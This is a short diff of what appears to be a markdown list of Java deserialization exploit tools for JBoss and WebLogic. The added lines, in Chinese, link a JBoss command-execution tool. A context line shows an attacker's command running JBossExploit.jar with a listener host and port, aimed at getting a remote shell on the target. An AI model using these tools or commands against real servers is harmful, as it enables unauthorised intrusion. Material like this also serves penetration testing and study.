@@ -45,6 +45,11 @@ root@Kali:~# java -jar JBossExploit.jar -lhost 123.123.123.123 -lport 999 -rhost
 
 [JBossExploit](https://github.com/njfox/Java-Deserialization-Exploit)  
 
+####三
+可眎化Jboss執行命令並回顯工具：  
+[JBOSS_EXP.jar](http://www.freebuf.com/tools/88908.html)
+
+
 ###weblogic：  
 
 ```
